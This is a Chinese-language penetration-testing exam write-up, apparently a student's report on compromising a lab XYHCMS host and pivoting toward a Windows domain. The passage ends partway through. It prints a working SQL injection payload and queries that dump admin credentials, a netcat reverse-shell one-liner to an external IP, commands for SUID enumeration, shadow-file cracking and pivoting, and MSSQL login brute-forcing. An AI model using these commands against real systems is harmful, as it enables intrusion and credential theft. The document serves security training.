1

概述

本次考核共通过八人，考核都是从外网打点到内网域渗透。

这次考核内容包括：代码审计、 linux提权、内网漫游 、域提权等。

2

渗透过程

这篇文章是学员考核的第五篇文章

1.拿到考核题目内容涉及：

代码审计 linux提权内 网漫游 域提权

ip:http://103.121.93.206

访问发现是一个xyhcms，网上搜索下载到一个3.5版本，在本地搭建phpstudy环

2.google搜索xycms漏洞，发现一篇反序列化利用文章：https://www.anquanke.com/post/id/232823，前提条件是要能够泄露配置文件http://103.121.93.206/App/Runtime/Data/config/site.php，访问发现这个版本并不存在泄露，于是又去网上找到一个3.6_20210601版本，应该和考核目标版本一致。
3.发现一篇文章：http://althims.com/2020/02/03/xyhcms-3-6/，前台存在sql注入漏洞，构造payload：

/xyhcms/index.php/Api/Lt/alist?orderby[updatexml(1,concat(0x3a,(select%20user()),0x3a),1);]=1

，可以爆出用户名root@localhost，先在本地查看表结构，
构造查询后台账号密码payload：

select group_concat(username,0x7e,password,0x7e,encrypt) from xyh_admin

结果发现一次最多只能显示32个字符，使用select right 一次读20字节：

select right (group_concat(username,0x7e,password,0x7e,encrypt) from xyh_admin, 20)

8.antsword上线，结果发现一直连不上，猜测可能是被宝塔拦截了，找到一篇过宝塔的文章：https://xw.qq.com/cmsid/20210329A0BI9M00，改用自己写的编码器，成功上线antsword。结果不能执行命令，phpinfo发现有很多disable_function，其中包括putenv，把很多绕过的方法不能用，查看phpinfo 发现开起来Server API FPM/FastCGI，找到一篇用fpm绕过disable_functions的文章：https://zhuanlan.zhihu.com/p/75114351?from_voters_page=true，成功执行命令

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 47.114.107.186 6832 > /tmp/f

，获得反弹shell
9.信息收集，

find / -type f -user root -perm -u=s -exec ls -l {} ; 2>/dev/null

查找root文件设置了sid的文件，没找到可以利用的。
sudo -l 查看可以用root权限执行的命令，结果需要输入www账号的密码；ps -aux 查看是否有可疑进程，并无发现；netstat -pantu 查看tcp端口连接；cat /etc/passwd 找到2个账号db、web1
lsb_release -a查看系统版本，发现是ubuntu18.04，内核5.0，ubuntu有一个很通用的提权exp，CVE-2021-3493，上传exp文件，编译执行直接获得root权限，得到第一个flag

10.上传msf的反弹shell，获得msf的sessions，

run autoroute -s 192.168.52.0/24

，设置路由，use socks_proxy 设置socks代理访问内网；arping发现内网主机：

for i in $(seq 1 254); do arping -w 1 -c 1 -I ens33 192.168.52.$i; done | grep "reply from"

，结果也没发现其他主机，估计是防火墙过滤了，看了拓扑图才知道是192.168.52.128，nmap对其top-100端口扫描：

proxychains nmap -top-port 100 -Pn 192.168.52.128

，结果发现只开启了1433端口；

针对1433进行-A扫描：proxychains nmap -p1433 -A -Pn 192.168.52.128，发现128应该是在域内：scaner.sec，主机名db，mssql版本selserver2012sp1，目标已经很明确了就是对1433端口进行渗透

11.首先想到的是对sa用户进行密码爆破，使用msf的scanner/mssql/mssql_login模块，结果爆破很久没出来；突然回想起来web服务器上有一个db用户很可疑，下载linux的shadow和passwd文件，使用john对其进行爆破密码，果然发现db的密码db123456

使用scanner/mssql/mssql_login进行确认sa db123456，db 123456，db db123456，sa 123456，结果都不是，由此陷入了僵局。查看很多mssql的资料发现原来sqlserver有2种登录方式，一种是sql server账号密码登录，这种账号密码是存在数据库的，还有一种是用windows的系统账号密码做验证，一般域环境会用这种， mssql_login模块设置USE_WINDOWS_AUTHENT为true，domain为scaner，找到登录账号密码：db db123456，要使用windows身份验证登录

12.使用admin/mssql/mssql_exec模块执行系统命令，一直失败，可能是账号的权限不够，于是想到先登录到数据库中看看，使用ssms.exe登数据库发现选择windows身份验证登录并不能指定账号和密码，google搜索大量资料才发现一篇文章：https://qa.1r1g.cn/dba/ask/4621011/，

成功登录sqlserver，查看数据库的内容，发现一条记录sa freepass，这明显就是数据库sa的账号密码，于是切换到sa登录，发现可以执行命令了，于是上传msf生成的exe的payload，结果提示：系统无法执行指定的程序，运行mssql的账号是mssqlserver，权限比较低。
